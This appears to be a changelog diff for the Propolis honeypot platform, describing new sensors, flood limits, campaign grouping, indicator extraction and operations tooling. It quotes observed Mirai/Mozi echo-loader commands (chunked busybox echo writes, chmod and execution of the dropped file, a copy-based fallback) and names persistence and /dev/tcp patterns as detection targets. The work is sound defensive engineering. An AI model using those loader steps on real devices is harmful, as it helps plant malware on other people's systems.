+  daemon, so a corrupted or truncated list can never exclude everything or silently exclude
+  nothing. Nothing is fetched from the network. Separately, an HTTP request whose User-Agent
+  contains a known crawler token gets `claimed_crawler` in its event metadata (a fixed label, not
+  the header text). The label is display only: a User-Agent is attacker-controlled, so it changes
+  no score, queue entry or feed decision, and a ClaudeBot User-Agent from an address that is not in
+  the file is scored and published like any other source
+  (`crates/core-scoring/src/allowlist.rs#load_allowlist_file`, `crates/sensor-http/src/crawler.rs#claimed_crawler`).
+
+- **Docs: `docs/operations/captured-content-handling.md`** - the operator procedure for a capture
+  that may be illegal material (above all CSAM): what the console and spool already do to limit
+  exposure (hash-named bodies, no rendering, download forced as an attachment), the rules (never
+  open or preview a capture, handle media and archives by hash, keep suspect files out of
+  VirusTotal upload and vendor paths), quarantining one sample by moving it out of the spool,
+  and the reporting process (US 18 U.S.C. 2258A and the CyberTipline, INHOPE hotlines elsewhere),
+  framed as process and not legal advice. It also lists what works against the procedure today
+  (automatic VirusTotal upload when opted in, 30-day deletion with no hold, tmpfs spools).
+
+- **`deploy/config-check.sh` compares the configuration with what is running** - five faults on
+  the production box were each found by accident: a typo in `PROPOLIS_SENSOR_LOGS`, MQTT's log
+  absent from that list, sensor-cred's PostgreSQL listener never producing a log (with 5432 open in
+  the firewall; the likely cause, another process holding the port, is exactly what the new check
+  names), `logrotate.timer` silently dead, and an
+  upgrade whose first run installed no new binary. The check is read-only and prints one row per
+  listener (unit, who holds the port, firewall, log age and size against the rotation size, the
+  `PROPOLIS_SENSOR_LOGS` entry as the daemon parses it, the newest ledger event) and an exact fix
+  line per failure. A firewall-open port held by something that is not the sensor is reported
+  first as `DANGEROUS`. Host rows cover the rotation timer and state file, the installed
+  binaries against the build and the deploy stamp, `watch.env` against `propolis.env`, and enabled
+  sensor units with no bind configured. It works without root and lists what that limited (`?`,
+  exit status `1`, never a pass); `--json` prints one document; exit `0` ok, `1` warnings, `2`
+  failures. `upgrade.sh` now runs it last with `--report-only`, so it can never fail an upgrade.
+  The listener derivation moved into `deploy/listeners-lib.sh`, which `fleet-listeners.sh` now
+  sources too, so the fleet inventory and the check share one table (the generated inventory is
+  byte-identical). No migration or wire change. See
+  [service lifecycle](docs/operations/service-lifecycle.md#configuration-check).
+- **Campaigns** - addresses doing the same thing are grouped into one campaign: the same captured
+  sample (a worm copying itself), the same normalized command sequence (addresses, ports, markers
+  and payload runs replaced, repeats collapsed; the w.sh script, the 45-command survey, Mirai
+  loaders), or three sensors reached from one address within an hour. A bounded background
+  indexer (`campaigns` subsystem) builds them from the ledger past a cursor, off the append path
+  (migration `0015`, no backfill; it reads an existing ledger at about 6,000 events a second after
+  the upgrade). New `/campaigns` and `/campaigns/{id}` pages; the review queue, IP and Samples
+  pages link to an address's or sample's campaign; `/samples/{sha256}` shows a sample's
+  campaigns and indicators. Approving a campaign's pending members is one explicit action that
+  lists them first and approves only the listed ones still pending. A sample campaign whose script
+  scans for and copies itself to new hosts shows its members as infected hosts on the console; the
+  vendor submission wording is unchanged. See `docs/operations/campaigns.md`.
+- **Indicators from artifacts and commands** - URLs, `/dev/tcp` endpoints, SSH and PEM key
+  fingerprints, crypt-hash markers (never the hash), IRC servers and channels, `/etc/hosts`
+  sinkholes, cron, systemd, rc.local, init.d, shell-profile and `chattr +i` persistence with their
+  drop paths, and proxy `CONNECT` templates and gateway hosts are extracted from commands, download
+  URLs and captured artifacts (binaries through their printable strings), sanitized, capped and
+  stored with their provenance. Embedded credentials are recorded only as present, never their
+  value. They are shown on the sample and campaign
+  pages and are not published to the feed or vendors.
+- **Propolis rotates its own sensor logs, and alerts when rotation fails** - the policy in
+  `/etc/logrotate.d/propolis-sensors` relied on the distribution's `logrotate.timer`, which was
+  inactive for eleven days on the production box; nothing rotated, one telnet log reached 6.6 GB
+  and `/var` reached 80% used. `propolis-logrotate.timer` (hourly, persistent) now runs
+  `logrotate` on that policy with its own state file, and `install.sh` and `upgrade.sh` install
+  and enable it, so a normal upgrade is the rollout. A `prerotate` free-space guard
+  (`/usr/local/sbin/propolis-logrotate-guard`) refuses to `copytruncate` a log that does not fit
+  on its filesystem, leaving it untouched while the other logs still rotate. Two ops-alert
+  conditions: `sensor-log-oversized` (a configured sensor log over three times the rotation size,
+  or the log filesystem over 85% used; clears below twice the size and 80%) and `rotation-stale`
+  (the rotation state file not rewritten for three hours). The monitor now evaluates fourteen
+  conditions. The hand recovery for a log too large to rotate is in
+  [retention](docs/operations/retention.md#a-log-too-large-to-rotate). A collector host that
+  installs by hand (split deployment) must also install the guard, units and timer; its page lists
+  the commands.
+- **Console log view keeps fields and folds repeats** - the `/logs` ring now keeps each event's
+  structured fields (`statement`, `elapsed`, `reason`, `sensor`, ...), so "slow statement" and
+  "submission held" say what was slow and why it was held. Values are capped at 512 bytes, 32
+  fields and a 2 KiB message, and the ring is held to 2 MiB charged from allocated capacity as
+  well as to its 1000 entries. The view shows fields inline and expands to all of them, folds
+  adjacent identical INFO entries from one target into one row with a count and the values each
+  field took, and opens filtered to warnings and errors with a count of the rows it hides; the
+  live stream folds by the same rule.
+- **Attackers pages through every scored address** - `/ips` stopped silently at 500 rows. It now
+  pages 500 at a time with a keyset cursor (`?after=` / `?before=`, the address the page
+  continues from) and says "showing 501-1,000 of N", exact to 100,000 rows and a labelled
+  estimate past that. The score sort orders by a key equal in order to the live score but
+  constant over time, so rows clamped at 100 do not trade places between pages. A note above
+  the table states the tier rule and why tier and live score can disagree.
+- **Review rows say what the address did** - each pending row has a context line: the sensors
+  it reached, its session count, its three most frequent signals, and its first upload or
+  download, else its first command after the Mirai shell-entry preamble. Counts come from at
+  most 5,000 of the address's events and say so when that is not all of them.
+- **Recent activity folds a flooding source** - the dashboard reads the newest 1,000 events and
+  folds consecutive events with one source, sensor and signal into one row with a count,
+  keeping the newest 20 runs, so one source can no longer fill the panel.
+- **IP page folds retries and echo-loader chunks** - consecutive sessions from one sensor that
+  ran the same commands fold into one card with a count and the usernames tried, and a run of
+  echo-loader chunk writes to one file (`assembled_file` / `chunk_index`) is one row,
+  "N echo chunks to FILE", with the lines behind an expander.
+- **Per-source command-event budget with flood summaries (ssh, telnet, adb)** - a handful of
+  Mirai-family echo loaders, each running the same ~53-command session around the clock and
+  several at once, made telnet 97% of all events (~15 a second, 2,555 from one address in ten
+  minutes), outran log rotation and put intake 6.6 GB behind. The per-connection cap of 256 could
+  not see it. Each of the three sensors now holds a token bucket per source network (/24 or /56)
+  charged by `honeypot_command_exec` events only (`CommandEventGate` in
+  `sensor_framework::command_flood`, reached through `ConnectionBudget::with_command_gate`):
+  burst 200, then 12 a minute, set by `PROPOLIS_<SSH|TELNET|ADB>_COMMAND_EVENT_RATE_PER_MIN` and
+  `_BURST` (a positive integer; zero or garbage exits 1; `Rate::per_minute` is new in
+  `sensor_framework::rate_limit`). Past it, a command event is not written but counted into one
+  `honeypot_command_exec` per network per 60 s window with `command_summary: true`,
+  `suppressed_count`, `distinct_commands` (shapes), up to 8 samples, first and last seen,
+  `session_count` and, for echo-loader chunks, `assembled_file` and `max_chunk_index`; it is
+  written when the window ends and at shutdown. Never summarized: logins, connections, downloads
+  and derived URLs, every capture upload, the per-session flood markers, the first command of each
+  shape per network per window (`command_shape` takes out `\xNN`/`\NNN` escape runs, hex runs of
+  16+ and base64-looking runs of 24+, so the observed 53-line session is 16 shapes whatever its
+  marker), and each address's first command event per window (scoring is per address). An
+  echo-loader chunk (a command event with `assembled_file`) is never a first: its bytes are in the
+  capture. Replies are unchanged: only logging is summarized. The summary scores as one command
+  event; the merit path is unaffected (60 s dedup), the volume path reaches its threshold later.
+  The observed loop, four parallel sessions every 30 s for ten minutes, drops from 4,240 command
+  events to 407 plus 10 summaries. Additive metadata: no migration or wire version change.
+- **Intake lag is visible and pages** - each intake poll records how many bytes of its log are
+  unread (`LogTailer::backlog_bytes`: the file past the read offset plus any rotated-out file
+  still being drained) and the `observed_at` of the last event it appended. `/metrics` publishes
+  `propolis_intake_bytes_behind{sensor}` and `propolis_intake_oldest_unread_age_seconds{sensor}`,
+  labelled with the `PROPOLIS_SENSOR_LOGS` name; the age is 0 when the poll read every complete
+  line and absent when lines wait but nothing has been appended since start, and a process that
+  tails nothing publishes neither. A new ops-alert condition, `intake-lagging`, pages when lines
+  have waited past max(10 min, 3 intake polls) for 10 minutes, or when the unread bytes rose at
+  three consecutive monitor polls that each found complete lines waiting; it clears when the log
+  is drained, or after three polls without growth once the wait is back under the threshold, and
+  never fires on an idle log. The fleet pane shows `behind: <bytes> / <age>` under LAST EVENT on
+  the listener rows of a log over the age threshold. No append-latency histogram: `/metrics` has
+  no histogram support. See `docs/operations/health-and-observability.md` and
+  `docs/troubleshooting/intake-backlog.md`.
+- **Echo-loader uploads are reassembled and captured** - a Mirai/Mozi telnet loader with no
+  usable `wget` uploads its downloader as some forty `busybox echo -ne '\xNN...' >> .i` lines,
+  runs `chmod 777 .i` and `./.i a b c d port`. Each line was logged but the file was never
+  captured, and the loader retried the whole session every few minutes. The shared shell (SSH,
+  telnet, ADB) now notes every file built from `echo`/`printf` output, chunk by chunk, and
+  captures it as one `honeypot_malware_upload` with `capture_reason` `echo_loader`,
+  `chunk_count` and `destination`, once the line that makes it executable or runs it has run, or
+  at the session's end for an assembly of two or more chunks never run. It goes through the
+  per-session stdin capture set (`StdinCaptures::record_assembled`; sensors pass it with
+  `FakeShell::with_captures` and report the ending with `StdinCaptures::end_session`), so one body
+  is one sample per session and the memory budget applies; a file is recognized by content, so
+  the loader's `cp /bin/ls .j && cat .i>.j && rm .i && cp .j .i` fallback is the same sample.
+  Each chunk's command event carries `assembled_file` and `chunk_index`. Running an assembled ELF
+  that holds a `GET <path> HTTP/1.x` request line with four octets and a port as arguments
+  executes nothing, answers as a downloader that cannot reach its server (no output, status 1),
+  and emits the stage-2 URL as a `honeypot_file_download` with `derived_from` `echo_loader_args`
+  and `derived_sha256`, which the review fetcher vets like any URL; the sensor makes no
+  connection. Additive metadata: no migration or wire version change.
+- **`propolis-watch`, a read-only live view of the sensors** - new crate `watch`, binary
+  `propolis-watch`. It streams every event log named in `PROPOLIS_SENSOR_LOGS` as JSON Lines on
+  stdout: a `start` record with the resolved sources, one `event` record per log line (the
+  sensor's JSON embedded byte for byte, or `raw` text when a line is not a JSON object), a
+  `dropped` record in place of each line over the 1 MiB cap, and a `heartbeat` every 10 s giving
+  each log's status (`following`, `missing` or `unreadable`), size and lines seen, so a quiet
+  node is distinguishable from a dead stream and a mistyped log path shows on the first
+  heartbeat. It starts at the end of each log by default (`--since-start` replays the current
+  file), follows `copytruncate` rotation, filters with `--sensor`, `--signal` and
+  `--source-ip`, and with `--journal` adds the `sensor-*` and `propolis` units' journal from a
+  `journalctl` child with a fixed argument vector. It writes no file, opens no socket and needs
+  no database or credential; a static test holds its source to that. Arguments also come from
+  `SSH_ORIGINAL_COMMAND`, split on whitespace only through the same allowlist, so it can run as
+  an SSH forced command: `deploy/provision.sh` now creates a `propolis-watch` login account
+  (home `/var/lib/propolis-watch`, shell `/bin/sh`, password field `*`, read-only membership in
+  every sensor group, no journal access unless added by hand), with its home, `.ssh` and
+  `authorized_keys` owned by root so the account cannot add a key to itself; `install.sh` and
+  `upgrade.sh` install the binary; and `deploy/watch-authorized-keys.example` shows the
+  `restrict`ed forced-command key line, `command="/usr/local/bin/propolis-watch"`. When
+  `PROPOLIS_SENSOR_LOGS` is not in its environment the watcher reads that one key from
+  `/etc/propolis/watch.env`, which the new `deploy/watch-env.sh` derives from `propolis.env` on
+  every provision (so every install and upgrade), copying only that line, root:propolis-watch
+  0640, atomically; the start record and heartbeat say which source the list came from. No key
+  is generated or installed. See `docs/operations/live-watch.md`.
+- **`log-tailer` gains a cursorless mode and owns the sensor-log list parser** -
+  `LogTailer::without_cursor` reads and follows rotation like the cursor-backed tailer but has
+  no cursor to load or save, and `read_batch_entries` reports each over-length discard in place.
+  `parse_sensor_logs` replaces the three copies of the `name:path` grammar in `propolis`,
+  `intake` and `shipper`; their behavior and error messages are unchanged.
+- **Every event records the port it arrived on** - the sensor framework stamps
+  `metadata.local_port` (an integer: the accepted TCP socket's local port, or the bound UDP
+  socket's port) on every event every sensor emits, uploads and the DNS and TFTP rate-limit
+  summaries included, without any sensor building the key. The transport stays in `protocol`.
+  Additive metadata: no migration, no wire or schema version change, and the hash chain is
+  unaffected. Each sensor crate gains a `tests/arrival.rs` that checks it against its real
+  listeners, and a coverage test fails for a sensor crate without one.
+- **`sensor-tftp` rate limits its request socket and refuses reflector and unroutable
+  sources** - the byte budget already kept every reply no larger than what the peer sent, but a
+  spoofed request flood still drew one ERROR per request at line rate toward the forged source,
+  and one event per request in the log. Every datagram on the request socket, malformed ones
+  included, now takes a token from its source network's bucket (IPv4 /24, IPv6 /56: 5 per
+  second, burst 10) and a global one (1000 per second, burst 2000), the same `ReplyRateLimiter`
+  and defaults as `sensor-dns`, set by `PROPOLIS_TFTP_REPLY_RATE_PER_SOURCE`,
+  `PROPOLIS_TFTP_REPLY_BURST_PER_SOURCE`, `PROPOLIS_TFTP_REPLY_RATE_GLOBAL` and
+  `PROPOLIS_TFTP_REPLY_BURST_GLOBAL` (positive integers; zero or garbage refuses to start). A
+  datagram over the limit gets no reply and no event of its own; each source network gets one
+  `query_status` `rate_limited` summary event per 10 s, the same event `sensor-dns` writes, with
+  samples of `"<rrq|wrq> <filename>"` or `malformed`, and shutdown writes the summaries still
+  accumulating. The packets of a running transfer arrive on its own socket and are not charged.
+  A request from source port 0, 7, 13, 17, 19 or 37, or from an unspecified, broadcast or
+  multicast address, now gets no transfer socket and no packet at all, not even the first ERROR
+  or ACK 0; its probe event carries `suppress_reason` (`reflective_source_port` or
+  `unroutable_source`). The transfer's send re-checks the same rule. The check
+  (`check_reply_source`) and the summary event (`rate_limited_event`) moved into
+  `sensor-framework`, and `sensor-dns` now uses the same implementations; its behavior is
+  unchanged. `start_test_server` and `start_test_server_with_capture_budget` (formerly
+  `start_test_server_with_handoff`) take the rate configuration and return a `TftpServer`.
+- **DNS honeypot sensor (default off)** - new crate and binary `sensor-dns`. `PROPOLIS_DNS_BIND`
+  serves DNS over UDP and TCP on the same address (conventionally 53); if either transport cannot
+  bind, the sensor exits 1 with nothing left listening. `PROPOLIS_DNS_TLS_BIND` adds DNS over TLS
+  (conventionally 853) with `PROPOLIS_DNS_TLS_CERT` and `PROPOLIS_DNS_TLS_KEY`, under the same
+  fail-closed rules as the other TLS sensors. It serves no records: every query that parses gets
+  REFUSED, the query's header rewritten (ID kept, RD and CD copied) and its first question echoed,
+  nothing appended, so a UDP reply is never larger than its query; the crate's one UDP `send_to`
+  re-checks that with a byte budget and refuses unspecified, broadcast and multicast sources and
+  the source ports 0, 7, 13, 17, 19 and 37 (recorded as `suppressed`). A message with QR set, a
+  non-zero opcode (NOTIFY, UPDATE), QDCOUNT other than 1, a compression pointer or bad label in
+  the question, a name over 255 bytes, a truncated question, or an answer or authority record
+  (except exactly one SOA authority record on an IXFR over TCP; an unparseable one is
+  `malformed_authority`) is recorded as `rejected` and gets no reply; on TCP and DoT it also
+  closes the connection, as does a length prefix under 12 or over 4096, a message that would pass
+  `PROPOLIS_DNS_MAX_CAPTURED_BYTES` (`byte_cap`; default 262272, 64 maximum-size queries with
+  their 2-byte prefixes), and a body cut short or not arriving within the read timeout
+  (`truncated_body`, `body_timeout`), each recorded with its `declared_len`. A connection carries
+  at most 64 queries, and a reply must be written within the read timeout. UDP replies are rate
+  limited per source network (IPv4 /24, IPv6 /56: 5 per second, burst 10) and in total (1000 per
+  second, burst 2000), set by `PROPOLIS_DNS_REPLY_RATE_PER_SOURCE`,
+  `PROPOLIS_DNS_REPLY_BURST_PER_SOURCE`, `PROPOLIS_DNS_REPLY_RATE_GLOBAL` and
+  `PROPOLIS_DNS_REPLY_BURST_GLOBAL` (positive integers; zero refuses to start). A datagram over
+  the limit gets no reply and no event of its own; each source network gets one
+  `query_status` `rate_limited` summary event per 10 s with counts, bytes, first and last seen
+  and up to 8 sample questions, so a flood cannot become a log flood. The limiter
+  (`ReplyRateLimiter`, `FloodLedger`) lives in `sensor-framework` with fixed-size tables. A UDP
+  query is a `honeypot_connection` over `udp`; a TCP or DoT connection is one
+  `honeypot_connection` plus one `honeypot_command_exec` per message, with `command`
+  `"<QTYPE> <qname>"`, or `malformed` for a message whose question did not parse. Metadata
+  records the header, the question (qname in escaped presentation form, sanitized), the EDNS
+  buffer size, DO bit and option codes (never option data), and `probe_signals`:
+  `amplification_probe`, `open_resolver_probe` (RD with class IN or ANY), `zone_transfer_probe`,
+  `chaos_fingerprint_probe`. DoT events carry `"tls": true`. A bind failure names the transport
+  (`udp`, `tcp`, `dot`) and the address. The unit
+  `deploy/sensor-dns.service` grants `CAP_NET_BIND_SERVICE` and
+  `ReadOnlyPaths=-/etc/propolis/tls`; `provision.sh` creates `propolis-dns` and its log
+  directory, `provision-tls.sh` mints a `dns` pair, and the fleet inventory derives
+  `dns/udp/<port>` and `dns/tcp/<port>` from the one bind plus `dns/tcp/<port>` from the TLS
+  bind. Known fingerprint costs: no OPT record is returned even when the query carried one, and
+  a denied zone transfer gets REFUSED, which some real servers answer with NOTAUTH.
+- **`sensor-cred` PostgreSQL answers a GSSENCRequest with `N`** - libpq sends a GSSENCRequest
+  (code 80877104) before anything else when built with GSSAPI, and a real server without GSS
+  encryption answers one `N` byte and keeps reading. The sensor did not handle it, so such a client
+  never reached the StartupMessage and its credentials were not captured. It now answers `N`, with
+  or without a TLS pair, and continues with the client's SSLRequest (answered `S` over TLS when
+  configured, tagged `"tls": true`) or plain StartupMessage. As in PostgreSQL, each negotiation
+  request is honoured once per connection and none inside TLS, so at most two precede the
+  StartupMessage and a repeated one closes the connection. A repeated SSLRequest on a plaintext
+  connection used to be read as a malformed StartupMessage; it now closes the connection too.
+- **In-band TLS on `sensor-cred` (default off)** - `PROPOLIS_CRED_TLS_CERT` and
+  `PROPOLIS_CRED_TLS_KEY` (the pair `provision-tls.sh` mints, key mode `0600`) enable TLS on the
+  existing PostgreSQL, MySQL, MSSQL and MongoDB ports. There is no TLS bind and no new port, so
+  the fleet inventory is unchanged; VNC is unchanged. PostgreSQL answers an SSLRequest `S` (until
+  now always `N`) and continues over TLS; a second SSLRequest inside TLS closes the connection and
+  plaintext sent after the `S` fails the handshake. MySQL advertises `CLIENT_SSL` and switches to
+  TLS on a client SSLRequest, answering the HandshakeResponse with OK at sequence id 3. MSSQL runs
+  the handshake inside TDS PRELOGIN packets, then Login7 and LOGINACK as raw TLS records, with TLS
+  1.3 session tickets off for MSSQL only: a client offering `ENCRYPT_ON` or `ENCRYPT_REQ` is
+  answered `ENCRYPT_ON` and gets TLS, a client offering `ENCRYPT_OFF` gets the pre-TLS PRELOGIN
+  response byte for byte and a plaintext session (a real server would answer `ENCRYPT_REQ`; the
+  honeypot keeps the credentials of scanners that cannot do TLS; for the same reason a client
+  that asked for encryption but then sends a plaintext Login7 is captured in plaintext), and
+  `ENCRYPT_NOT_SUP` or no option gets `ENCRYPT_NOT_SUP` and plaintext. MongoDB peeks the first two
+  bytes and serves `0x16 0x03` (a TLS record header) over TLS on the plaintext port, so a
+  plaintext first message whose length's low byte is `0x16` is no longer mistaken for TLS; its
+  connection event is written before the handshake, so a failed handshake is still recorded.
+  Plaintext clients keep working on every port. Events from a TLS session carry `"tls": true`
+  (for PostgreSQL, MySQL and MSSQL the pre-negotiation connection event stays untagged). The
+  startup line names only the TLS-capable protocols that are bound. Fail-closed: when either variable is set (a
+  blank value counts as unset), exactly one set, a non-UTF-8 value, or an unusable pair makes the
+  sensor exit 1 before binding anything. A bind failure on one protocol is still logged and skipped. The unit gains
+  `ReadOnlyPaths=-/etc/propolis/tls`. The MSSQL TDS-TLS adapter is validated against a rustls
+  client and the MS-TDS text only; the owner smoke tests against real drivers are listed in
+  `docs/operations/networking-tls.md`.
+- **FTPS and AUTH TLS on `sensor-ftp` (default off)** - `PROPOLIS_FTP_TLS_CERT` and
+  `PROPOLIS_FTP_TLS_KEY` (the pair `provision-tls.sh` mints, key mode `0600`) enable AUTH TLS on
+  the plain listener, which until now answered `500`. One optional listener in the same process,
+  writing the same event log and sharing the capture hand-off and memory budget, exists only when
+  its bind is set (no compiled default): `PROPOLIS_FTP_TLS_BIND` (deploy convention
+  `0.0.0.0:990`, implicit TLS, requires the pair). `AUTH TLS`, `TLS-C`, `SSL` and `TLS-P` answer
+  `234` and upgrade, other AUTH types get `504`, AUTH inside TLS gets `503`. Plaintext pipelined
+  behind AUTH TLS is refused before any `234` with one `honeypot_command_exec` event
+  (`starttls_refused: pipelined_plaintext`, the byte count, never the bytes), a
+  `504 Pipelined commands after AUTH TLS refused.` and a close. The upgrade resets the session as
+  REIN would (user, login, PBSZ, PROT, passive listener) and keeps the captured-byte count.
+  PBSZ is accepted inside TLS only (`200 PBSZ set to 0.`), PROT takes `C` and `P` after PBSZ
+  (`S` and `E` get `536`), FEAT lists AUTH, PBSZ and PROT only when TLS is configured, and with no
+  pair set AUTH, PBSZ and PROT still answer `500`. After `PROT P` the passive data socket is
+  wrapped in TLS once the data peer passed the source-IP check (handshake bounded by the read
+  timeout, a failure gets `425`), STOR over it is spooled exactly like plaintext, and a data close
+  without `close_notify` counts as end of file. Connection, login and upload events from a session
+  whose control channel is TLS carry `"tls": true`; plain events are unchanged. QUIT now shuts the
+  stream down after `221`. Fail-closed: exactly one of cert and key, a TLS bind without both, an
+  invalid bind, or an unusable pair makes the sensor exit 1 before binding anything, and a bind
+  failure on any listener stops the others and exits 1. Cert and key without a TLS bind enable
+  AUTH TLS and open no 990 listener. `fleet-listeners.sh` derives an `ftp` tcp listener from
+  `PROPOLIS_FTP_TLS_BIND`, and the unit gains `ReadOnlyPaths=-/etc/propolis/tls`.
+- **SMTPS, SMTP submission and STARTTLS on `sensor-smtp` (default off)** - `PROPOLIS_SMTP_TLS_CERT`
+  and `PROPOLIS_SMTP_TLS_KEY` (the pair `provision-tls.sh` mints, key mode `0600`) turn STARTTLS
+  from the old `454` reply into a real upgrade on the plain listeners. Two optional listeners in
+  the same process, writing the same event log, exist only when their bind is set (no compiled
+  default): `PROPOLIS_SMTP_SUBMISSION_BIND` (deploy convention `0.0.0.0:587`, plain with
+  STARTTLS) and `PROPOLIS_SMTP_TLS_BIND` (`0.0.0.0:465`, implicit TLS, requires the pair).
+  STARTTLS replies `220 2.0.0 Ready to start TLS`, refuses plaintext pipelined behind it with
+  one `honeypot_command_exec` event (`starttls_refused: pipelined_plaintext`, the byte count,
+  never the bytes) and a `554` before any handshake, forces a fresh EHLO and resets MAIL, RCPT
+  and BDAT state after the upgrade, answers a second STARTTLS inside TLS with `503`, and answers
+  STARTTLS with parameters with `501` (only when TLS is configured). EHLO inside TLS omits
+  STARTTLS. Connection, login and data events from a TLS session carry `"tls": true`; plain
+  events are unchanged, and with no TLS variable set the sensor is byte-identical (STARTTLS
+  advertised, `454`). Fail-closed: exactly one of cert and key, a TLS bind without both, an
+  invalid bind, or an unusable pair makes the sensor exit 1 before binding anything, and a bind
+  failure on any listener stops the others and exits 1. Cert and key without a TLS bind enable
+  STARTTLS and open no 465 listener. `fleet-listeners.sh` derives an `smtp` tcp listener from
+  each of the two new bind variables, and the unit gains `ReadOnlyPaths=-/etc/propolis/tls`.
+- **MQTTS on `sensor-mqtt` (default off)** - a second, implicit-TLS listener in the same process,
+  serving the same persona into the same event log, enabled by `PROPOLIS_MQTT_TLS_BIND` (no
+  compiled default; the deploy convention is `0.0.0.0:8883`) together with
+  `PROPOLIS_MQTT_TLS_CERT` and `PROPOLIS_MQTT_TLS_KEY` (the pair `provision-tls.sh` mints, key
+  mode `0600`). MQTT 3.1, 3.1.1 and 5.0 work over it, there is no STARTTLS, and binary-PUBLISH
+  spooling, the capture memory budget and the shutdown drain are shared with the plain listener.
+  Events from a TLS session (connection, login, command, malformed first packet, malware upload,
+  session end) carry `"tls": true`; plain events are unchanged. A failed or stalled handshake is
+  dropped with no event and cut at the read timeout. Fail-closed: exactly one of cert and key, a
+  TLS bind without both, an invalid bind, or an unusable pair makes the sensor exit 1 before
+  binding anything. Cert and key without a TLS bind load and validate the pair, start no TLS
+  listener and log one warning, so a TLS listener never opens implicitly. Every session now ends
+  with a stream shutdown (`close_notify` on TLS, a FIN on a plain connection). `fleet-listeners.sh`
+  derives an `mqtt` tcp listener from `PROPOLIS_MQTT_TLS_BIND`, and the unit gains
+  `ReadOnlyPaths=-/etc/propolis/tls`.
+- **Redis over TLS on `sensor-redis` (default off)** - a second, implicit-TLS (`rediss://`)
+  listener in the same process, serving the same persona into the same event log, enabled by
+  `PROPOLIS_REDIS_TLS_BIND` (no compiled default; the deploy convention is `0.0.0.0:6380`)
+  together with `PROPOLIS_REDIS_TLS_CERT` and `PROPOLIS_REDIS_TLS_KEY` (the pair
+  `provision-tls.sh` mints, key mode `0600`). There is no STARTTLS. Events from a TLS session
+  (connection, login, command) carry `"tls": true`; plain events are unchanged, and the AUTH
+  password is never captured. A failed or stalled handshake is dropped with no event and cut at
+  the read timeout. Fail-closed: exactly one of cert and key, a TLS bind without both, an invalid
+  bind, or an unusable pair makes the sensor exit 1 before binding anything. Cert and key without
+  a TLS bind load and validate the pair, start no TLS listener and log one warning, so a TLS
+  listener never opens implicitly. `fleet-listeners.sh` derives a `redis` tcp listener from
+  `PROPOLIS_REDIS_TLS_BIND`, and the unit gains `ReadOnlyPaths=-/etc/propolis/tls`.
+- **HTTPS on `sensor-http` (default off)** - a second, implicit-TLS listener in the same process,
+  serving the same nginx persona into the same event log, enabled by `PROPOLIS_HTTP_TLS_BIND`
+  (no compiled default; the deploy convention is `0.0.0.0:443`) together with
+  `PROPOLIS_HTTP_TLS_CERT` and `PROPOLIS_HTTP_TLS_KEY` (the pair `provision-tls.sh` mints, key
+  mode `0600`). Events from a TLS session carry `"tls": true`; plain events are unchanged. A
+  failed or stalled handshake is dropped with no event and cut at the read timeout. Fail-closed:
+  exactly one of cert and key, a TLS bind without both, an invalid bind, or an unusable pair makes
+  the sensor exit 1 before binding anything. Cert and key without a TLS bind load and validate the
+  pair, start no TLS listener and log one warning, so a TLS listener never opens implicitly.
+  `fleet-listeners.sh` derives an `http` tcp listener from `PROPOLIS_HTTP_TLS_BIND`, and the unit
+  gains `ReadOnlyPaths=-/etc/propolis/tls`.
+- **Sensor TLS foundation** - `sensor-framework` gains
+  a `tls` module: a fail-closed loader for a per-sensor certificate and key (a missing, oversized,
+  non-regular, malformed or mismatched file, or a key readable by group or other, is an error and
+  never a fallback), an implicit-TLS listener that reuses the plain TCP listener's connection
+  bounds and cuts the handshake at the read timeout, and a plaintext-to-TLS stream type for
+  STARTTLS-style upgrades. No client certificates are requested. `provision-certs` gains
+  `--sensor-tls <out-dir> <sensor>...`, which mints one self-signed pair per sensor and keeps a
+  pair that already exists. New `deploy/provision-tls.sh`, run by `install.sh` and `upgrade.sh`
+  after the binaries are installed, mints the pairs into `/etc/propolis/tls`
+  (`0711` root-owned, created by `provision.sh`; keys `0600`, certificates `0644`, both owned by
+  the sensor's user); a real certificate placed at those paths survives re-runs. A minted pair is
+  used only once its sensor's TLS variables are set (the six entries above).
+- **MQTT binary PUBLISH payloads are now spooled** - `sensor-mqtt` still records every PUBLISH as
+  metadata, and now also hands a payload that passes the shared `looks_binary` gate to the framework
+  capture hand-off, emitting a `honeypot_malware_upload` event (`capture_reason`
+  `binary_publish_payload`). Text payloads stay metadata-only. New `PROPOLIS_MQTT_SPOOL_DIR`
+  (default `/var/spool/propolis/mqtt`), `PROPOLIS_MQTT_OUTBOX_DIR` and
+  `PROPOLIS_MQTT_CAPTURE_MEMORY_BYTES` variables; the unit grants the spool in `ReadWritePaths`,
+  `provision.sh` creates it, and the review spool walk (`BODY_SPOOLERS`) now includes `mqtt`.
+  Operators with an existing install should back `/var/spool/propolis/mqtt` with a
+  noexec,nosuid,nodev mount like the other spools.
+- **MQTT 5.0 on `sensor-mqtt`, and a session summary** - the sensor first declined a 5.0 CONNECT
+  with CONNACK reason `0x84`, so a strict 5.0 scanner stopped at CONNECT and none of its
+  SUBSCRIBE or PUBLISH recon was captured. It now speaks 5.0 in full: CONNECT (with its will
+  properties), PUBLISH, SUBSCRIBE, UNSUBSCRIBE, PUBREL and AUTH are parsed and answered in 5.0 wire
+  form, and 3.1 and 3.1.1 behave as before. A properties block is parsed strictly inside its
+  declared length (at most 64 properties, no panic on any input), so a malformed property sets
+  `properties_parse_error` but can neither corrupt the packet boundary nor fail the packet. The
+  recon-relevant properties are logged (session expiry, receive and packet-size maxima, topic alias
+  and its maximum, request-response-information, the authentication-method name, and the first 16
+  user properties with a full count); Authentication-Data is a credential and, like the password,
+  is never stored or logged. Also new: a connection whose first packet is malformed or not a
+  CONNECT now emits a second `honeypot_connection` event (`malformed`, a `reason`, a bounded hex
+  snippet) instead of closing silently; every connection ends with a `honeypot_session_end`
+  summary (packets, publishes, subscribes, bytes, duration, client id); and the idle wait after
+  CONNECT is bounded by 1.5 times the client keepalive.
+- **MQTT honeypot sensor (`sensor-mqtt`, default-off)** - a recon trap for TCP/1883 that records
+  MQTT CONNECT credentials (never the password), SUBSCRIBE topics and PUBLISH topic and payload
+  metadata (length, a bounded preview, a SHA-256), and answers just enough of the protocol that a
+  client carries on. It never delivers, retains or forwards a message, opens no outbound
+  connection and executes nothing; a binary PUBLISH payload is quarantined, never run (see the
+  entries above). The parser caps a packet at 256 KiB of declared length, a connection at 1024
+  packets and the configured byte budget, and refuses a malformed or oversize packet by closing
+  the connection. The sensor is off until `PROPOLIS_MQTT_BIND` is set, and its unit grants no
+  `CAP_NET_BIND_SERVICE` (1883 is unprivileged).
